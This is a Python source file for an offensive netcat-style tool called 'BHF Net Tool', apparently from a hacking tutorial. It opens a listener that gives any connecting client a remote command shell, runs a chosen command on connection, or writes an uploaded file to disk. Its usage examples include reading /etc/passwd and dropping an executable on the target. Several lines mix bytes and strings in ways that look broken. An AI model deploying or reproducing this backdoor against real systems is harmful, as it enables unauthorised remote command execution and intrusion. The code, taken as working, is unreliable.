import sys
import socket
import getopt
import threading
import subprocess

listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0

def usage():
    print("\t\tBHF Net Tool\n")
    print("""Usage: bhpnet.py -t target_host -p port""")
    print("""-l --listen                  -listen on [host]:[port] 
                              for incoming connections""")
    print("""-e --execute=file_to_run     -execute the given file upon 
                              receiving a connection""")
    print("""-c --command                 -initialize a command shell""")
    print("""-u --upload=destination      -upon receiving connection upload a 
                              file and write to (destination)""")
    print("\nExample: ")
    print("\tbhpnet.py -t 192.168.1.1 -p 5555 -l -c")
    print("\tbhpnet.py -t 192.168.1.1 -p 5555 -l -u=c:\\target.exe")
    print("\tbhpnet.py -t 192.168.1.1 -p 5555 -l -e=\"cat /etc/passwd\"")
    print("\techo 'ABCDXYZ' | ./bhpnet.py -t 192.168.1.1 -p 135")
    sys.exit(0)

def run_command(command):
    command = command.strip()
    try: 
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Failed to execute command.\r\n"
    return output

def client_sender(butter):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        client.connect((target, port))
        if len(butter):
            client.send(butter.encode())
        while True:
            recv_len = 1
            response = ""
            
            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data
                
                if recv_len < 4096:
                    break
                
            print(response)
            
            butter = input("")
            butter += "\n"
            
            client.send(butter.encode())
            
    except:
        print("[*] Exception! Exiting.")
        client.close()

def client_handle(client_socket):
    global upload
    global execute
    global command
    
    if len(upload_destination):
        file_buffer = ""
        
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            else:
                file_buffer += data
                
        try: 
            file_descriptor = open(upload_destination, "wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()
            
            client_socket.send("Successfully saved file to %s\r\n" % upload_destination.encode())
        except:
            client_socket.send("Failed to save file to %s\r\n" % upload_destination.encode())
        
    if len(execute):
        output = run_command(execute)
        
        client_socket.send(output.encode())
        
    if command:
        while True:
            if client_socket.fileno() == -1:
                break
            
            client_socket.send(b"<BHP:#> ")
            cmd_buffer = b""
            while b"\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)
                
            response = run_command(cmd_buffer)
            client_socket.send(response.encode())

def server_loop():
    global target
    
    if not len(target):
        target = "0.0.0.0"
        
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)
        
    while True:
        client_socket, addr = server.accept()
            
        client_thread = threading.Thread(target=client_handle, args=(client_socket,))
        client_thread.start()

def main():
    global listen
    global command
    global upload_destination
    global port
    global execute
    global target
    
    if not len(sys.argv[1:]):
        usage()
    try: 
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu", ["help", "listen", "execute", "target", "port", "command", "upload"])
    except getopt.GetoptError as err:
        print(str(err))
        usage()
    
    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--command"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandled Option"
            
    if not listen and len(target) and port > 0:
        buffer = sys.stdin.read()
        client_sender(buffer)
    if listen:
        server_loop()
        
main()
